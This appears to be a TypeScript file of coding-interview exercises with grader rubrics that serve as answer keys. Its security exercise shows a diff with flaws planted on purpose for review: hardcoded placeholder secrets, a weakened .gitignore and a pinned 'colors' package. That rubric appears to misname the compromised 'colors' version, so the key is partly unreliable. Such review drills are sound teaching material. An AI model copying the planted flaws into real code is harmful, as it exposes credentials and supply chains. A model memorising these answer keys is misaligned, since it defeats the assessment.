          "Evaluate how well the developer explains the misconception to a non-security audience. Can they show concretely how to decode the JWT in 30 seconds (paste into jwt.io — no tools needed)? The `internalAdminNotes` field is the most egregious issue: any user can see their own admin notes by decoding their token. But the Stripe customer ID is also a real risk — combined with other data, it could facilitate fraud. Evaluate whether the developer addresses the mobile team lead's specific claim ('it's signed so it's secure') with a concrete counterexample, not just an abstract explanation. Give credit for explaining that signing guarantees *authenticity* (you issued it) but not *confidentiality* (nobody can read it). If encryption is needed, the standard is JWE — note whether the developer mentions it.",
      },
    ],
  },

  {
    id: uuidv5('exercise-015-dependency-audit'),
    title: 'The Dependency Audit',
    description: `You are reviewing this PR before it gets merged to main. The developer says "just a small cleanup plus one new feature." Identify every problem you find.

\`\`\`diff
// package.json
-  "dependencies": {
-    "express": "^4.18.2",
-    "pg": "^8.11.0"
-  },
-  "devDependencies": {
-    "jest": "^29.0.0",
-    "dotenv": "^16.0.0"
-  }
+  "dependencies": {
+    "express": "^4.18.2",
+    "pg": "^8.11.0",
+    "dotenv": "^16.0.0",
+    "jest": "^29.0.0",
+    "colors": "1.4.0"
+  }
\`\`\`

\`\`\`diff
// src/config.ts
+ const API_KEY = 'sk-prod-a8f3c2e1d7b4f9a2c8e1d7b4f9a2c8e1'
+ const DB_PASSWORD = 'hunter2'
+
  export const config = {
+   apiKey: API_KEY,
+   dbPassword: DB_PASSWORD,
    port: process.env['PORT'] ?? 3000,
  }
\`\`\`

\`\`\`diff
// .gitignore
  node_modules/
  dist/
- .env
\`\`\`

List every issue. Explain the severity and impact of each one.`,
    duration: 15,
    difficulty: 'easy',
    type: 'code',
    category: 'security',
    languages: ['typescript', 'javascript'],
    tags: ['security', 'code-review', 'dependencies'],
    topics: ['dependency-management', 'secrets-management', 'supply-chain-security', 'gitignore', 'devdependencies'],
    variations: [
      {
        ownerRole: 'Security engineer who does weekly dependency audits and has responded to two supply chain incidents in the past year',
        ownerContext:
          "There are four distinct issues. (1) `jest` and `dotenv` moved from devDependencies to dependencies — these will be installed in production, bloating the bundle and increasing attack surface. (2) `colors@1.4.0` is a known supply chain incident: the maintainer intentionally shipped a version with malicious code that entered infinite loops. Pinning to an exact version of a compromised package is actively harmful. (3) `API_KEY` and `DB_PASSWORD` are hardcoded in source — they are now in git history permanently, even if removed in a future commit. The secrets must be rotated immediately after being committed. (4) `.env` was removed from `.gitignore` — any developer who now runs with a local `.env` file will accidentally commit it on the next `git add .`. Evaluate whether the developer identifies all four, rates the severity correctly (hardcoded secrets + .gitignore removal are critical; dependency misclassification is medium; colors is high), and knows that rotating secrets is the only fix once they've been committed.",
      },
      {
        ownerRole: 'Senior developer who reviews 15+ PRs per week and has a checklist for security-sensitive changes',
        ownerContext:
          "Evaluate the developer's code review completeness and their ability to explain business impact. Finding the issues is the baseline — explaining severity is the real skill. The hardcoded API_KEY should trigger an immediate conversation: 'This key may already be compromised if this PR was pushed to a shared branch. We need to rotate it now, not after merge.' The `.gitignore` issue is subtle but critical: the developer may not realize that removing `.env` from `.gitignore` affects every team member's local environment on next pull. Give credit for: identifying all four issues, explaining the `colors` supply chain risk specifically (not just 'pinned version is bad'), and recommending concrete next steps for the hardcoded secrets.",
      },
    ],
  },

  // -------------------------------------------------------------------------
  // Architecture
  // -------------------------------------------------------------------------

  {
    id: uuidv5('exercise-016-caching-decision'),
    title: 'The Caching Decision',
    description: `Your product analytics dashboard endpoint is getting slow. It aggregates 90 days of event data for the current user and is now taking 3–8 seconds for active users. You have been asked to fix it.

Three engineers on the team each proposed a solution in Slack:

- **Engineer A:** "Add a Redis cache. Cache the result for 5 minutes. Problem solved."
- **Engineer B:** "The query is the problem. Let's add a materialized view and refresh it hourly."
- **Engineer C:** "This is a read-heavy, user-specific endpoint. Move it behind a CDN with a short TTL and user-scoped cache keys."

Your tech lead is asking you to decide. Which approach do you recommend, and why? What would make you change your recommendation?`,
    duration: 30,
    difficulty: 'hard',
    type: 'chat',
    category: 'architecture',
    languages: [],
    tags: ['architecture', 'caching', 'performance'],
    topics: ['caching', 'redis', 'materialized-views', 'cdn', 'cache-invalidation', 'trade-offs', 'performance'],
    variations: [
      {
        ownerRole: 'Staff engineer who has implemented all three caching strategies in production and has strong opinions about when each is appropriate',
        ownerContext:
          "Evaluate the developer's ability to reason about trade-offs, not just pick an answer. Each approach has merits and failure modes. Redis: correct, but adds operational complexity, doesn't fix the slow query (it still runs once per cache miss for each user), and 5-minute stale data may be unacceptable for a dashboard. Materialized view: fixes the underlying query, but hourly refresh may produce stale data in a product analytics context where users expect near-real-time numbers. CDN: wrong tool for user-specific authenticated data — CDN caching of user-scoped endpoints is complex and error-prone (cache poisoning risk). The pragmatic answer for most teams: fix the query first (add indexes, move to pre-aggregation), then add Redis caching if needed. Give credit for: identifying stale data risk for each approach, asking about freshness requirements before deciding, and noting that 'caching a slow query' is not the same as 'fixing a slow query.'",
      },
      {
        ownerRole: 'CTO of a 12-person startup who has been burned by adding premature infrastructure complexity and is asking the dev to justify every new moving part',
        ownerContext:
          "Evaluate the developer's judgment about organizational complexity. Redis means a new infrastructure dependency, new failure modes (Redis down → dashboard down), and operational knowledge requirements. Materialized view is database-native and operationally simple, but requires understanding PostgreSQL internals. CDN for auth endpoints is a trap — most junior engineers haven't dealt with the cache poisoning risk of user-specific CDN entries. The right question to ask before any of these: 'Have we looked at EXPLAIN ANALYZE on the actual query?' The answer may be that a single index eliminates the problem entirely at zero operational cost. Give credit for: questioning the problem framing (why is it slow?), proposing the simplest intervention first (query optimization), and only recommending infrastructure additions if the query is already optimal.",
      },
    ],
  },

  // -------------------------------------------------------------------------
  // SQL (6 exercises)
  // -------------------------------------------------------------------------

  {
    id: uuidv5('exercise-017-window-functions'),
    title: 'The Window Function Challenge',
    description: `Your analytics team needs a report that shows each employee's salary, their department average, and their rank within the department. A junior wrote this:

\`\`\`sql
SELECT
  e.name,
  e.department,
  e.salary,
  d.avg_salary
FROM employees e
JOIN (
  SELECT department, AVG(salary) as avg_salary
  FROM employees
  GROUP BY department
) d ON d.department = e.department
ORDER BY e.department, e.salary DESC;
\`\`\`

Rewrite this using window functions. Add a rank column. Explain why window functions are better here and when they would NOT be better.`,
    duration: 15,
    difficulty: 'easy',
    type: 'code',
    category: 'backend',
    languages: ['sql'],
    tags: ['sql', 'window-functions', 'analytics'],
    topics: ['sql', 'window-functions', 'rank', 'partition-by', 'query-readability'],
    variations: [
      {
        ownerRole: 'Senior data engineer with 10 years building analytics pipelines at a Fortune 500 retailer',
        ownerContext:
          "Evaluate whether the developer understands window functions beyond just syntax. The rewrite should use `AVG(salary) OVER (PARTITION BY department)` and `RANK() OVER (PARTITION BY department ORDER BY salary DESC)`. Key evaluation points: (1) do they understand that window functions don't collapse rows like GROUP BY? (2) can they explain the performance difference — the subquery version scans the table twice while the window function version scans once? (3) for the 'when NOT better' question, do they mention that window functions can be slower when you actually need aggregated output (fewer rows) rather than per-row annotations? Give credit for mentioning DENSE_RANK vs RANK distinction.",
      },
      {
        ownerRole: 'Database instructor who teaches SQL to bootcamp graduates and has seen every common misunderstanding about window functions',
        ownerContext:
          "Evaluate clarity of explanation more than code correctness. Can the developer explain PARTITION BY in terms a junior would understand — 'it creates invisible groups without collapsing rows'? Do they correctly use the OVER clause syntax? A common mistake is forgetting ORDER BY inside the window for RANK, or confusing RANK (gaps after ties) with DENSE_RANK (no gaps). Give credit for: clean syntax, explaining the mental model, and providing a concrete example of when the subquery approach is actually preferable (e.g., when you need to filter on the aggregate before joining back).",
      },
    ],
  },

  {
    id: uuidv5('exercise-018-migration-safety'),
    title: 'The Dangerous Migration',
    description: `Your team needs to rename a column from \`email_address\` to \`email\` on a table with 40M rows. The production database serves 2,000 requests per second. A junior developer wrote this migration:

\`\`\`sql
-- Migration: rename email_address to email
ALTER TABLE users RENAME COLUMN email_address TO email;
\`\`\`

Your deployment pipeline runs migrations before the new code is deployed. The new code references \`email\`, the old code references \`email_address\`. Explain every problem with this approach and write a safe migration plan.`,
    duration: 25,
    difficulty: 'hard',
    type: 'code',
    category: 'backend',
    languages: ['sql'],
    tags: ['sql', 'migrations', 'zero-downtime'],
    topics: ['database-migrations', 'zero-downtime-deployments', 'backward-compatibility', 'postgresql', 'column-rename'],
    variations: [
      {
        ownerRole: 'Senior DBA with 12 years at a fintech who has personally witnessed a column rename take down a production system for 45 minutes',
        ownerContext:
          "The core problem: if the migration runs before the new code deploys, the old code (still referencing `email_address`) will immediately throw errors on every query that touches that column. This is a breaking change with zero tolerance for deployment timing. The safe approach is a multi-step migration: (1) add new column `email`, (2) backfill data from `email_address` to `email`, (3) deploy code that writes to BOTH columns and reads from `email`, (4) once all code uses `email`, drop the old column in a later migration. On a 40M-row table, the backfill must be batched to avoid locking the table. Evaluate whether the developer identifies the deployment ordering problem, proposes the expand-contract pattern, and accounts for the table lock risk during backfill. Give extra credit for mentioning that PostgreSQL's RENAME COLUMN is instant (metadata-only) but the real risk is application-level, not database-level.",
      },
      {
        ownerRole: 'Platform engineer responsible for the deployment pipeline who has seen 6 migration-related incidents in the past year',
        ownerContext:
          "Evaluate whether the developer thinks about the deployment pipeline, not just the SQL. The migration runs BEFORE the code deploys — this means there is a window where old code is running against the new schema. Any migration that is not backward-compatible with the currently-running code will cause downtime. Evaluate their migration plan for: (1) backward compatibility at every step, (2) rollback safety — can each step be reversed without data loss? (3) monitoring — how do they know the backfill completed successfully? Give credit for mentioning that they would test the migration against a production-sized dataset in staging first, and for estimating the backfill duration.",
      },
    ],
  },

  {
    id: uuidv5('exercise-019-indexing-strategy'),
    title: 'The Missing Index',
    description: `Your users table has 5M rows. This query powers the admin search page and takes 12 seconds:

\`\`\`sql
SELECT id, username, email, created_at, last_login_at
FROM users
WHERE LOWER(email) LIKE '%@example.com'
  AND status = 'active'
  AND created_at > '2025-01-01'
ORDER BY last_login_at DESC
LIMIT 50;
\`\`\`

The table currently has a B-tree index on \`(id)\` and \`(email)\`. Design an indexing strategy. Explain what indexes you would add, why, and what trade-offs each introduces.`,
    duration: 20,
    difficulty: 'medium',
    type: 'code',
    category: 'backend',
    languages: ['sql'],
    tags: ['sql', 'indexing', 'performance'],
    topics: ['database-indexing', 'btree', 'gin', 'partial-indexes', 'composite-indexes', 'explain-analyze'],
    variations: [
      {
        ownerRole: 'PostgreSQL performance consultant who has optimized databases for 30+ companies and can read EXPLAIN output in their sleep',
        ownerContext:
          "Multiple issues to identify: (1) `LOWER(email)` prevents the existing email index from being used — need a functional index on `LOWER(email)` or use `citext` type; (2) `LIKE '%@example.com'` with a leading wildcard cannot use a B-tree index efficiently — need a trigram GIN index (`pg_trgm` extension) or reverse the string; (3) a composite index on `(status, created_at)` with an `INCLUDE (last_login_at)` could serve the WHERE and ORDER BY. Evaluate whether the developer understands that each index has a write-cost trade-off — more indexes means slower INSERT/UPDATE. Give credit for: identifying the LOWER() problem, knowing about trigram indexes for wildcard searches, proposing a partial index (`WHERE status = 'active'` to reduce index size), and discussing the ORDER BY optimization with covering indexes.",
      },
      {
        ownerRole: 'Backend tech lead who needs to approve index additions and has seen indexes that helped one query but destroyed write throughput',
        ownerContext:
          "Evaluate the developer's judgment, not just their index knowledge. Do they consider the write impact? This is an admin search page — it probably runs a few times per hour. Adding 3 new indexes to speed up an infrequent query may not be worth the write overhead on a table with high insert volume. Evaluate whether they ask about write patterns before proposing indexes. Give credit for: suggesting EXPLAIN ANALYZE as a first step, proposing the minimum number of indexes needed, considering partial indexes to reduce overhead, and questioning whether the leading wildcard in the LIKE pattern is truly necessary (maybe the UI can enforce 'starts with' instead of 'contains').",
      },
    ],
  },

  {
    id: uuidv5('exercise-020-deadlock-investigation'),
    title: 'The Deadlock Mystery',
    description: `Your application logs show intermittent deadlock errors — about 5 per hour during peak traffic. The error message from PostgreSQL is:

\`\`\`
ERROR: deadlock detected
DETAIL: Process 12345 waits for ShareLock on transaction 67890;
blocked by process 67891.
Process 67891 waits for ShareLock on transaction 67892;
blocked by process 12345.
\`\`\`

The two functions involved are:

\`\`\`typescript
async function transferCredits(fromUserId: string, toUserId: string, amount: number) {
  await db.transaction(async (tx) => {
    await tx.execute(\`UPDATE wallets SET balance = balance - $1 WHERE user_id = $2\`, [amount, fromUserId])
    await tx.execute(\`UPDATE wallets SET balance = balance + $1 WHERE user_id = $2\`, [amount, toUserId])
  })
}
\`\`\`

Explain why this deadlocks. Fix it. Explain how you would verify the fix works under concurrent load.`,
    duration: 25,
    difficulty: 'hard',
    type: 'code',
    category: 'backend',
    languages: ['typescript', 'python', 'sql'],
    tags: ['sql', 'deadlock', 'concurrency'],
    topics: ['deadlocks', 'database-transactions', 'lock-ordering', 'concurrency', 'postgresql-locks'],
    variations: [
      {
        ownerRole: 'Staff backend engineer who has debugged production deadlocks at a payment processing company handling 100k transactions per minute',
        ownerContext:
          "The deadlock occurs when two concurrent transfers happen in opposite directions: Transfer A (user1 → user2) locks user1's row then waits for user2's row. Transfer B (user2 → user1) locks user2's row then waits for user1's row. Classic lock ordering problem. The fix: always acquire locks in a deterministic order — sort the user IDs and update the lower ID first, regardless of transfer direction. Evaluate whether the developer can articulate the exact interleaving that causes the deadlock, not just 'two transactions waiting for each other.' Give credit for: explaining the specific lock acquisition order, proposing deterministic ordering as the fix, and suggesting a concurrent load test (e.g., 100 threads doing random transfers) to verify. Extra credit for mentioning advisory locks as an alternative approach.",
      },
      {
        ownerRole: 'Senior SRE who monitors database health dashboards and needs to understand deadlocks well enough to triage them at 3 AM',
        ownerContext:
          "Evaluate the developer's diagnostic thinking. Can they read the PostgreSQL deadlock error message and understand which processes are involved? Do they know that PostgreSQL automatically detects and resolves deadlocks by killing one transaction — meaning the application must handle retry logic? The fix (deterministic lock ordering) is important, but so is the retry strategy for the remaining edge cases. Give credit for: reading the error message correctly, proposing the ordering fix, adding a retry mechanism with exponential backoff for any remaining deadlocks, and suggesting monitoring (track deadlock frequency before and after the fix to verify it worked).",
      },
    ],
  },

  {
    id: uuidv5('exercise-021-schema-design'),
    title: 'The Schema Design Interview',
    description: `You are designing the database schema for a multi-tenant SaaS application that manages employee time-off requests. Requirements:

- Multiple organizations (tenants), each with departments
- Employees belong to one department, managers approve requests
- Time-off types: vacation, sick, personal (each with a yearly allowance)
- Requests have: start date, end date, type, status (pending/approved/denied), optional notes
- Managers need to see all pending requests for their department
- HR needs a report of total days used per employee per type per year

Design the schema. Show the tables, columns, types, and relationships. Explain your indexing strategy for the two query patterns mentioned.`,
    duration: 25,
    difficulty: 'medium',
    type: 'whiteboard',
    category: 'backend',
    languages: [],
    tags: ['sql', 'schema-design', 'multi-tenant'],
    topics: ['schema-design', 'normalization', 'multi-tenancy', 'indexing', 'foreign-keys', 'data-modeling'],
    variations: [
      {
        ownerRole: 'Principal engineer who has designed multi-tenant schemas for 3 different SaaS products and has strong opinions about tenant isolation',
        ownerContext:
          "Evaluate the schema for: (1) tenant isolation — is `organization_id` on every table or just the top-level? Row-level security vs. application-level filtering? (2) normalization — time-off types should be a separate table, not an enum, because allowances vary by type and org; (3) the manager relationship — is it on the department table or the employee table? Both are valid but have different implications for cross-department management; (4) indexing for the two queries: manager query needs `(department_id, status)` index on requests; HR report needs `(employee_id, type, year)` or a composite. Give credit for considering soft deletes, audit trails, and the edge case where an employee changes departments mid-year. Deduct for schemas that would require full table scans for either query pattern.",
      },
      {
        ownerRole: 'Senior developer who has maintained a multi-tenant app for 4 years and knows the pain points that emerge at scale',
        ownerContext:
          "Evaluate practical design decisions. Does the developer store the number of days in the request or calculate it from start/end dates? Calculating is correct but requires handling weekends and holidays — do they acknowledge this complexity? Does their schema handle half-days? Does the allowance table account for rollover or prorated allowances for mid-year hires? These are real-world complications that a good schema anticipates. Give credit for: a clean normalized schema, acknowledging the date calculation complexity without over-engineering it, and explaining how the schema would handle the most common change request ('we need to add a new time-off type').",
      },
    ],
  },

  {
    id: uuidv5('exercise-022-query-optimization'),
    title: 'The Slow Dashboard Query',
    description: `Your product dashboard shows a summary of orders per customer segment. This query runs every time the page loads and takes 8 seconds:

\`\`\`sql
SELECT
  c.segment,
  COUNT(DISTINCT o.id) as order_count,
  SUM(o.total_amount) as revenue,
  AVG(o.total_amount) as avg_order_value,
  COUNT(DISTINCT c.id) as unique_customers
FROM customers c
JOIN orders o ON o.customer_id = c.id
WHERE o.created_at BETWEEN '2025-01-01' AND '2025-12-31'
  AND o.status != 'cancelled'
GROUP BY c.segment
HAVING COUNT(DISTINCT o.id) > 10
ORDER BY revenue DESC;
\`\`\`

The \`orders\` table has 25M rows. The \`customers\` table has 2M rows. Optimize this query. Show your reasoning step by step.`,
    duration: 20,
    difficulty: 'medium',
    type: 'code',
    category: 'backend',
    languages: ['sql'],
    tags: ['sql', 'performance', 'optimization'],
    topics: ['query-optimization', 'explain-analyze', 'materialized-views', 'indexing', 'aggregation'],
    variations: [
      {
        ownerRole: 'Senior DBA at an e-commerce company who reviews every slow query that crosses the 1-second threshold',
        ownerContext:
          "Evaluate the developer's optimization approach. Key issues: (1) the JOIN produces a large intermediate result set (potentially millions of rows) before aggregation; (2) `COUNT(DISTINCT)` is expensive — two of them on different tables doubles the cost; (3) `status != 'cancelled'` prevents index use on status (negative conditions are hard to index). Optimization strategies: (a) add a composite index on `orders(created_at, status, customer_id, total_amount)` as a covering index; (b) pre-filter orders in a CTE or subquery before joining; (c) consider a materialized view refreshed on a schedule for dashboard queries. Give credit for identifying that this query runs on every page load and should probably be cached or pre-computed, not optimized to run live against 25M rows.",
      },
      {
        ownerRole: 'Backend architect who has moved three different dashboards from live queries to pre-aggregated data and knows the trade-offs intimately',
        ownerContext:
          "Evaluate whether the developer questions the premise. A dashboard that aggregates 25M rows on every page load is architecturally wrong regardless of how fast the query is. The real fix is pre-aggregation: a background job that computes segment summaries hourly or daily and writes them to a summary table. The dashboard reads from the summary table in < 10ms. Evaluate whether the developer: (1) identifies this as an architecture problem, not just a SQL problem; (2) proposes both an immediate SQL fix (for tonight) and a long-term fix (pre-aggregation); (3) considers the staleness trade-off of pre-aggregated data. Give credit for pragmatism — fixing the query now and proposing the architecture change as a follow-up.",
      },
    ],
  },

  // -------------------------------------------------------------------------
  // Design Patterns (5 exercises)
  // -------------------------------------------------------------------------

  {
    id: uuidv5('exercise-023-observer-pattern'),
    title: 'The Observer Pattern Trap',
    description: `Your notification system uses an observer pattern. When an order is placed, it notifies: email service, analytics tracker, inventory updater, and loyalty points calculator. A developer added a fifth observer last week and now order placement sometimes takes 15 seconds. Here is the implementation:

\`\`\`typescript
class OrderEventEmitter {
  private listeners: Array<(order: Order) => Promise<void>> = []

  on(listener: (order: Order) => Promise<void>) {
    this.listeners.push(listener)
  }

  async emit(order: Order) {
    for (const listener of this.listeners) {
      await listener(order)
    }
  }
}
\`\`\`

Identify the problem. Refactor the code to fix it while keeping the observer pattern. Explain what guarantees you are gaining or losing with your fix.`,
    duration: 15,
    difficulty: 'easy',
    type: 'code',
    category: 'backend',
    languages: ['typescript', 'python'],
    tags: ['design-patterns', 'observer', 'performance'],
    topics: ['observer-pattern', 'async-patterns', 'error-handling', 'event-driven', 'promise-all'],
    variations: [
      {
        ownerRole: 'Senior architect who has implemented event systems at scale and has seen observer patterns both save and destroy systems',
        ownerContext:
          "The problem is sequential execution: `await` inside the loop means each observer runs one after another. If the fifth observer takes 10 seconds (e.g., a slow external API call), the entire order placement blocks for 10+ seconds. The fix: use `Promise.allSettled(this.listeners.map(fn => fn(order)))` for parallel execution. But evaluate whether the developer understands the trade-off: parallel execution means a slow observer no longer blocks others, but it also means execution order is non-deterministic. Some observers might depend on ordering (e.g., inventory must decrement before loyalty points calculate). Give credit for: identifying the sequential bottleneck, using `allSettled` (not `all` — one failure shouldn't cancel others), and discussing which observers are safe to parallelize vs. which need ordering guarantees.",
      },
      {
        ownerRole: 'Staff engineer who maintains the order processing pipeline and has a zero-tolerance policy for user-facing latency caused by background work',
        ownerContext:
          "Evaluate whether the developer questions what should be synchronous at all. Email notifications, analytics tracking, and loyalty points are NOT part of the critical path for order placement. They should be fire-and-forget or queued, not awaited. The real fix is: only inventory update should be synchronous (it affects order success/failure); everything else should be dispatched to a background queue. Give credit for: distinguishing critical-path observers from background observers, proposing a queue-based approach for non-critical work, and adding error handling (what happens when the analytics observer throws — does it fail the order?). Deduct if they only parallelize without questioning whether observers should block at all.",
      },
    ],
  },

  {
    id: uuidv5('exercise-024-strategy-pattern'),
    title: 'The Strategy Pattern Refactor',
    description: `Your payment processing code handles multiple payment methods. Every time a new payment method is added, the function grows. The PM just told you to add Apple Pay as the sixth method. Before you add it, refactor using the strategy pattern.

\`\`\`typescript
async function processPayment(method: string, amount: number, details: any) {
  if (method === 'credit_card') {
    const result = await stripe.charges.create({ amount, currency: 'usd', source: details.token })
    return { success: true, transactionId: result.id }
  } else if (method === 'paypal') {
    const result = await paypal.createPayment({ amount, currency: 'USD', payerId: details.payerId })
    return { success: true, transactionId: result.paymentId }
  } else if (method === 'bank_transfer') {
    const result = await bankApi.initiateTransfer({ amount, accountId: details.accountId, routing: details.routing })
    return { success: result.status === 'initiated', transactionId: result.referenceId }
  } else if (method === 'crypto') {
    const result = await cryptoGateway.send({ amountUsd: amount, walletAddress: details.wallet })
    return { success: result.confirmed, transactionId: result.txHash }
  } else if (method === 'gift_card') {
    const card = await giftCardService.redeem(details.cardNumber, details.pin, amount)
    return { success: card.redeemed, transactionId: card.redemptionId }
  }
  throw new Error(\`Unknown payment method: \${method}\`)
}
\`\`\`

Refactor this using the strategy pattern. Then add Apple Pay. Explain what makes this better than the if-else chain.`,
    duration: 15,
    difficulty: 'easy',
    type: 'code',
    category: 'backend',
    languages: ['typescript', 'python'],
    tags: ['design-patterns', 'strategy', 'refactoring'],
    topics: ['strategy-pattern', 'open-closed-principle', 'polymorphism', 'refactoring', 'type-safety'],
    variations: [
      {
        ownerRole: 'Senior engineer who has refactored payment systems at two different companies and has opinions about when patterns help vs. when they add ceremony',
        ownerContext:
          "Evaluate the developer's strategy implementation. The correct approach: define a `PaymentStrategy` interface with a `process(amount: number, details: unknown): Promise<PaymentResult>` method, implement one class per payment method, and use a registry (Map or factory) to select the right strategy at runtime. Key evaluation points: (1) does the interface capture the common return type? (2) is the `details` parameter typed per strategy (each payment method needs different details)? (3) does the registry handle unknown methods gracefully? Give credit for addressing the `any` type on `details` — each strategy should define its own detail type. Deduct for over-engineering: abstract base classes with 5 template methods for a simple dispatch problem.",
      },
      {
        ownerRole: 'Tech lead who has seen junior developers apply design patterns where a simple lookup table would suffice',
        ownerContext:
          "Evaluate whether the developer applies the pattern at the right level of abstraction. The strategy pattern is the right call here because each payment method has genuinely different logic, not just different parameters. But evaluate whether they consider a simpler alternative first: if all payment methods had the same API shape, a config-driven approach (lookup table of API clients) would be simpler. The developer should articulate WHY strategy is appropriate here: each method has unique parameters, unique API calls, and unique result mapping. Give credit for: a clean interface, proper typing, easy extensibility (adding Apple Pay should be: create class + register it), and explaining the open/closed principle — adding a new method shouldn't require modifying existing code.",
      },
    ],
  },

  {
    id: uuidv5('exercise-025-factory-pattern'),
    title: 'The Factory Pattern Decision',
    description: `Your application creates different types of notifications: email, SMS, push, and in-app. Each has different setup requirements, different external service dependencies, and different retry policies. Currently, the creation logic is scattered across 8 files with duplicated setup code.

Design a factory (or abstract factory) that centralizes notification creation. Show the types, the factory implementation, and how client code uses it. Explain whether you chose Factory Method or Abstract Factory and why.`,
    duration: 20,
    difficulty: 'medium',
    type: 'code',
    category: 'backend',
    languages: ['typescript', 'python'],
    tags: ['design-patterns', 'factory', 'architecture'],
    topics: ['factory-pattern', 'abstract-factory', 'dependency-injection', 'solid-principles', 'creational-patterns'],
    variations: [
      {
        ownerRole: 'Staff engineer who has refactored notification systems at three companies and prefers composition over inheritance in every case',
        ownerContext:
          "Evaluate whether the developer understands the distinction between Factory Method (subclass decides) and Abstract Factory (family of related objects). For notifications, the choice depends on whether the notification types share behavior (Factory Method with a base class) or are fundamentally different implementations of a common interface (Abstract Factory or simple factory function). Key evaluation: (1) does the factory encapsulate the external service dependencies, so client code doesn't need to know about Twilio vs. SendGrid? (2) does it handle the retry policy differences — email can retry 3 times, SMS once, push is fire-and-forget? (3) is the factory testable — can you inject mock services? Give credit for choosing the simpler pattern (a factory function with a switch or map is often better than class hierarchies) and justifying the choice.",
      },
      {
        ownerRole: "Engineering manager who has seen teams spend 2 weeks building 'extensible' factories that never needed extending",
        ownerContext:
          "Evaluate pragmatism. Does the developer build the simplest factory that solves the stated problem (4 notification types, duplicated setup)? Or do they build an over-engineered AbstractNotificationFactoryProvider with 6 levels of indirection? The right answer for most teams: a single factory function that takes a notification type and returns a configured notification sender. No abstract classes, no inheritance trees. Give credit for: solving the duplication problem directly, making the factory easy to test, and acknowledging that if a fifth notification type is added in 6 months, the factory should be easy to extend — but not pre-built for it.",
      },
    ],
  },

  {
    id: uuidv5('exercise-026-decorator-pattern'),
    title: 'The Decorator Pattern in Practice',
    description: `Your API has a base HTTP client. Different endpoints need different combinations of: logging, retry logic, authentication headers, rate limiting, and response caching. Currently, each endpoint handler manually assembles these features:

\`\`\`typescript
async function fetchUserProfile(userId: string) {
  const startTime = Date.now()
  let attempts = 0
  while (attempts < 3) {
    try {
      const response = await fetch(\`/api/users/\${userId}\`, {
        headers: { Authorization: \`Bearer \${getToken()}\` }
      })
      console.log(\`fetchUserProfile took \${Date.now() - startTime}ms\`)
      if (response.status === 429) {
        await sleep(1000 * Math.pow(2, attempts))
        attempts++
        continue
      }
      return response.json()
    } catch (e) {
      attempts++
      if (attempts >= 3) throw e
    }
  }
}
\`\`\`

This same logging + retry + auth + rate-limit pattern is copy-pasted in 12 endpoint functions. Refactor using the decorator pattern so each concern is composable.`,
    duration: 20,
    difficulty: 'medium',
    type: 'code',
    category: 'backend',
    languages: ['typescript', 'python'],
    tags: ['design-patterns', 'decorator', 'composition'],
    topics: ['decorator-pattern', 'composition', 'middleware', 'separation-of-concerns', 'dry-principle'],
    variations: [
      {
        ownerRole: 'Senior engineer who has built HTTP client libraries used by 40+ microservices and understands the middleware/decorator pattern deeply',
        ownerContext:
          "Evaluate the developer's decorator implementation. The base should be a simple `HttpClient` interface with a `fetch(url, options)` method. Each decorator wraps the client and adds one concern: `LoggingClient`, `RetryClient`, `AuthClient`, `RateLimitClient`, `CachingClient`. Composition: `new LoggingClient(new RetryClient(new AuthClient(baseClient)))`. Key evaluation: (1) does each decorator only add one responsibility? (2) is the order of decoration considered — caching should be outermost (check cache before retry), auth should be innermost (add headers to every actual request)? (3) are the decorators independently testable? Give credit for: clean single-responsibility decorators, correct ordering reasoning, and type safety (each decorator should implement the same interface).",
      },
      {
        ownerRole: 'Tech lead who prefers functional composition over class-based decorators and will push back on unnecessary OOP ceremony',
        ownerContext:
          "Evaluate whether the developer considers a functional approach. In TypeScript, decorators can be higher-order functions: `const client = withLogging(withRetry(withAuth(baseFetch)))`. This is often simpler than class hierarchies. Evaluate: (1) does the functional approach maintain the same composability? (2) is it easier to read — can a new developer understand the decoration chain at a glance? (3) does the developer acknowledge the trade-off: functional decorators are simpler but harder to inspect at runtime (you can't easily ask 'does this client have retry?'). Give credit for either approach if well-justified, but deduct for defaulting to classes without considering alternatives.",
      },
    ],
  },

  {
    id: uuidv5('exercise-027-state-machine'),
    title: 'The State Machine for Order Lifecycle',
    description: `Your e-commerce order system has these states: \`draft\`, \`submitted\`, \`payment_pending\`, \`paid\`, \`preparing\`, \`shipped\`, \`delivered\`, \`cancelled\`, \`refunded\`. Currently, state transitions are scattered across 15 API endpoints with ad-hoc validation:

\`\`\`typescript
// In cancelOrder handler:
if (order.status !== 'submitted' && order.status !== 'paid' && order.status !== 'preparing') {
  throw new Error('Cannot cancel order in current state')
}
order.status = 'cancelled'

// In shipOrder handler:
if (order.status !== 'preparing') {
  throw new Error('Cannot ship order in current state')
}
order.status = 'shipped'
\`\`\`

Design a state machine that encapsulates all valid transitions, enforces them in one place, and triggers side effects (email, inventory update) on specific transitions. Show the implementation and explain how you would add a new state (\`returned\`) in the future.`,
    duration: 25,
    difficulty: 'medium',
    type: 'code',
    category: 'backend',
    languages: ['typescript', 'python'],
    tags: ['design-patterns', 'state-machine', 'domain-modeling'],
    topics: ['state-machine', 'finite-automata', 'domain-modeling', 'side-effects', 'transition-guards'],
    variations: [
      {
        ownerRole: 'Staff engineer who has implemented state machines for payment processing, order fulfillment, and insurance claims workflows',
        ownerContext:
          "Evaluate the state machine design for completeness and correctness. The implementation should: (1) define all valid transitions as a configuration (e.g., a map from `[currentState, event]` to `nextState`); (2) enforce transitions centrally — no ad-hoc state changes anywhere in the codebase; (3) support side effects (hooks or listeners on transitions — 'when transitioning from paid to cancelled, trigger a refund'); (4) be serializable — the current state is stored in the DB, not in memory. Key test: can the developer enumerate all valid transitions? `draft → submitted`, `submitted → payment_pending`, `payment_pending → paid`, etc. Give credit for: a clean transition map, side-effect hooks, and explaining how adding `returned` is just adding new entries to the configuration without modifying existing transition logic.",
      },
      {
        ownerRole: 'Domain-driven design practitioner who has used state machines in 5 different bounded contexts and knows when they help and when they over-constrain',
        ownerContext:
          "Evaluate whether the developer models the domain correctly. Some transitions have guards: cancellation from `paid` state requires a refund, but cancellation from `submitted` state does not. Does the state machine support transition guards (conditions beyond just the current state)? Also evaluate: does the developer consider that `cancelled` might need sub-states (cancelled-before-payment vs. cancelled-after-payment)? Give credit for: discussing guards and conditions, handling the `cancelled` vs `refunded` distinction (refunded is a transition from cancelled, not a direct state), and acknowledging that the state machine should be the single source of truth — no code should set `order.status` directly.",
      },
    ],
  },

  // -------------------------------------------------------------------------
  // Architecture (6 exercises)
  // -------------------------------------------------------------------------

  {
    id: uuidv5('exercise-028-microservices-boundaries'),
    title: 'The Microservice Boundary Decision',
